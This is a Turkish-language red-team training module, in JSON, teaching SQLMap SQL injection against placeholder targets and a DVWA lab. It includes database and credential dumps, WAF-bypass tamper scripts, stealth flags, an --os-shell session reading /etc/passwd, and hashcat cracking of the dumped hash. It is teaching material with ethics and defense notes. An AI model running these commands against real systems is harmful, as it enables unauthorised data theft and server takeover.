@@ -1,0 +1,187 @@
+{
+  "id": "sqlmap",
+  "slug": "sqlmap",
+  "title": "SQLMap",
+  "subtitle": "Otomatize SQL Enjeksiyon Tespiti ve Sömürüsü",
+  "description": "SQLMap, web uygulamalarındaki SQL enjeksiyon açıklarını otomatik olarak tespit eden, sınıflandıran ve sömüren açık kaynaklı bir penetrasyon testi aracıdır. Boolean-based, time-based, error-based ve UNION-based enjeksiyon tekniklerini destekler.",
+  "team": "red-team",
+  "category": "Web Uygulama Güvenliği",
+  "phase": "Exploitation",
+  "icon": "💉",
+  "color": "#ef4444",
+  "tags": ["sqlmap", "sql-injection", "database", "web", "exploitation", "WAF-bypass"],
+  "modules": [
+    {
+      "id": "basics",
+      "title": "SQL Enjeksiyonu Temelleri ve SQLMap Kurulumu",
+      "description": "SQL enjeksiyon türlerini anla, SQLMap'i kur ve ilk basit testleri gerçekleştir.",
+      "difficulty": "beginner",
+      "duration": "50 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "SQL Enjeksiyonu Nedir?",
+          "content": "SQL enjeksiyonu, kullanıcıdan alınan girdinin veritabanı sorgusuna doğrudan eklendiği durumlarda ortaya çıkan bir güvenlik açığıdır. OWASP Top 10'da A03:2021 Injection kategorisinde yer alır.\n\nInjection türleri:\n1. In-band SQLi: Error-based (hata mesajlarından bilgi), UNION-based (ek veri çekme)\n2. Blind SQLi: Boolean-based (true/false cevap), Time-based (gecikme ile bilgi)\n3. Out-of-band SQLi: DNS/HTTP üzerinden veri exfiltration\n\nSQLMap bu tekniklerin tamamını otomatize eder, ancak arka planda ne yaptığını anlamak önemlidir. Manuel enjeksiyon mantığını öğrendikten sonra SQLMap kullanın.\n\nEtik not: SQLMap, yalnızca yazılı izin alınan sistemlerde ya da tasarım gereği zafiyet içeren eğitim ortamlarında (DVWA, HackTheBox, TryHackMe) kullanılmalıdır."
+        },
+        {
+          "id": "installation",
+          "type": "installation",
+          "title": "Kurulum",
+          "installation": {
+            "note": "Kali Linux'ta varsayılan olarak yüklüdür.",
+            "linux": [
+              "sudo apt install sqlmap -y",
+              "sqlmap --version"
+            ],
+            "windows": [
+              "git clone https://github.com/sqlmapproject/sqlmap.git",
+              "python3 sqlmap/sqlmap.py --version"
+            ]
+          }
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Temel SQLMap Komutları",
+          "commands": [
+            {
+              "command": "sqlmap -u \"http://hedef.com/page.php?id=1\" --dbs",
+              "description": "GET parametresini test et ve veritabanlarını listele",
+              "output": "available databases [3]:\n[*] information_schema\n[*] mysql\n[*] web_app",
+              "flags": [
+                { "flag": "-u URL", "description": "Hedef URL (parametre ile birlikte)" },
+                { "flag": "--dbs", "description": "Tüm veritabanlarını listele" }
+              ]
+            },
+            {
+              "command": "sqlmap -u \"http://hedef.com/page.php?id=1\" -D web_app --tables",
+              "description": "Belirtilen veritabanındaki tabloları listele",
+              "output": "Database: web_app\n[3 tables]\n+----------+\n| users    |\n| products |\n| sessions |",
+              "flags": [
+                { "flag": "-D DBNAME", "description": "Hedef veritabanı adı" },
+                { "flag": "--tables", "description": "Tabloları listele" }
+              ]
+            },
+            {
+              "command": "sqlmap -u \"http://hedef.com/page.php?id=1\" -D web_app -T users --dump",
+              "description": "users tablosunun tüm verilerini çek",
+              "output": "Database: web_app  Table: users\n+----+----------+----------------------------------+\n| id | username | password                         |\n+----+----------+----------------------------------+\n| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |\n| 2  | john     | 482c811da5d5b4bc6d497ffa98491e38 |",
+              "tip": "Hash'ler MD5 gibi görünüyor. hashcat veya john ile kırabilirsiniz.",
+              "flags": [
+                { "flag": "-T TABLE", "description": "Hedef tablo" },
+                { "flag": "--dump", "description": "Tablo içeriğini çek" },
+                { "flag": "-C username,password", "description": "Sadece belirli sütunları çek" }
+              ]
+            },
+            {
+              "command": "sqlmap -u \"http://hedef.com/login\" --data=\"username=admin&password=test\" --method POST --dbs",
+              "description": "POST form verisiyle test",
+              "flags": [
+                { "flag": "--data", "description": "POST body verisi" },
+                { "flag": "--method POST", "description": "HTTP metodu" }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "advanced",
+      "title": "İleri Teknikler, Bypass ve Otomasyon",
+      "description": "WAF atlatma, cookie tabanlı test, os-shell ve karmaşık senaryolar.",
+      "difficulty": "advanced",
+      "duration": "80 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "İleri Seviye SQLMap Parametreleri",
+          "commands": [
+            {
+              "command": "sqlmap -u \"http://hedef.com/page.php?id=1\" --cookie=\"PHPSESSID=abc123; security=low\" --dbs",
+              "description": "Session cookie ile kimlik doğrulaması gerektiren sayfalarda test",
+              "flags": [
+                { "flag": "--cookie", "description": "Cookie değerleri (tarayıcı Developer Tools'tan kopyalayın)" }
+              ]
+            },
+            {
+              "command": "sqlmap -u \"http://hedef.com/page.php?id=1\" --level=5 --risk=3 --dbs",
+              "description": "Agresif mod — daha fazla payload ve test",
+              "warning": "Level 5 ve Risk 3, hedefe çok sayıda istek gönderir ve loglanma ihtimali yüksektir.",
+              "flags": [
+                { "flag": "--level 1-5", "description": "Test derinliği (1=hızlı, 5=kapsamlı)" },
+                { "flag": "--risk 1-3", "description": "Risk seviyesi (3=UPDATE/DELETE içeren payloadlar)" }
+              ]
+            },
+            {
+              "command": "sqlmap -u \"http://hedef.com/page.php?id=1\" --tamper=space2comment,between,randomcase --dbs",
+              "description": "WAF/IDS bypass — tamper scriptleri ile payload gizleme",
+              "tip": "Tamper scriptleri /usr/share/sqlmap/tamper/ dizininde bulunur. Birden fazla kombinleyebilirsiniz.",
+              "flags": [
+                { "flag": "--tamper space2comment", "description": "Boşlukları /**/ ile değiştir" },
+                { "flag": "--tamper between", "description": "= yerine BETWEEN kullan" },
+                { "flag": "--tamper randomcase", "description": "Rastgele büyük/küçük harf" },
+                { "flag": "--tamper base64encode", "description": "Payload'ı Base64'e çevir" }
+              ]
+            },
+            {
+              "command": "sqlmap -u \"http://hedef.com/page.php?id=1\" --os-shell",
+              "description": "OS shell — veritabanı sunucu üzerinde komut çalıştır",
+              "warning": "Bu özellik yalnızca DBA yetkisi olan veritabanı hesaplarında çalışır. SADECE yetkili lab ortamlarında kullanın.",
+              "output": "os-shell> whoami\nwww-data\nos-shell> cat /etc/passwd | head -5\nroot:x:0:0:root:/root:/bin/bash"
+            },
+            {
+              "command": "sqlmap -r istek.txt --dbs",
+              "description": "Burp Suite'ten yakalanan HTTP isteğini dosya olarak ver",
+              "tip": "Burp Suite Proxy'de isteğe sağ tıklayıp 'Save item' ile kaydedin. En güvenilir yöntemdir.",
+              "flags": [
+                { "flag": "-r DOSYA", "description": "Ham HTTP istek dosyası" },
+                { "flag": "-p param", "description": "Hangi parametreyi test edeceğini belirt" }
+              ]
+            },
+            {
+              "command": "sqlmap -u \"http://hedef.com/page.php?id=1\" --technique=BEUSTQ --dbms=mysql --threads=5 --random-agent --dbs",
+              "description": "Tüm parametreler — stealth mod",
+              "flags": [
+                { "flag": "--technique=BEUSTQ", "description": "B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline" },
+                { "flag": "--dbms=mysql", "description": "Veritabanı tipini belirt (hız kazanır)" },
+                { "flag": "--threads=N", "description": "Paralel thread sayısı" },
+                { "flag": "--random-agent", "description": "Rastgele User-Agent kullan" },
+                { "flag": "--delay=0.5", "description": "İstekler arası gecikme (saniye)" }
+              ]
+            }
+          ]
+        },
+        {
+          "id": "lab",
+          "type": "lab",
+          "title": "CTF Senaryosu: DVWA — SQL Injection",
+          "scenario": {
+            "title": "DVWA Low Security — Tam Veritabanı Sömürüsü",
+            "objective": "DVWA (Damn Vulnerable Web Application) üzerinde SQL enjeksiyon zafiyetini SQLMap ile tespit et, admin hash'ini çek ve kır.",
+            "environment": "DVWA (localhost:80) — Security Level: Low",
+            "difficulty": "beginner",
+            "steps": [
+              "DVWA'yı başlat: docker run --rm -p 80:80 vulnerables/web-dvwa",
+              "Tarayıcıda localhost açıp admin/password ile giriş yap",
+              "Security sekmesinden 'Low' seç",
+              "SQL Injection sayfasına git — URL'yi kopyala",
+              "Burp Suite ile bir istek yakala ve dosyaya kaydet",
+              "sqlmap -r dvwa_request.txt --cookie='security=low;PHPSESSID=...' --dbs komutunu çalıştır",
+              "dvwa veritabanında users tablosunu bul ve dump et",
+              "Elde edilen MD5 hash'i hashcat veya crackstation.net ile kır"
+            ],
+            "hints": [
+              "DVWA cookie'sini tarayıcı developer tools (F12 > Application > Cookies) üzerinden alın",
+              "admin hash'i: 5f4dcc3b5aa765d61d8327deb882cf99 — bu ne anlama gelir?",
+              "hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt"
+            ],
+            "flag": "password (admin'in şifresi)",
+            "defenseNote": "Savunma: Prepared Statements ve Parameterized Queries kullanın. ORM tercih edin. Tüm kullanıcı girdilerini whitelist validasyondan geçirin. Web Application Firewall (WAF) koyun. Veritabanı kullanıcısına en az yetki verin (LEAST PRIVILEGE)."
+          }
+        }
+      ]
+    }
+  ]
+}
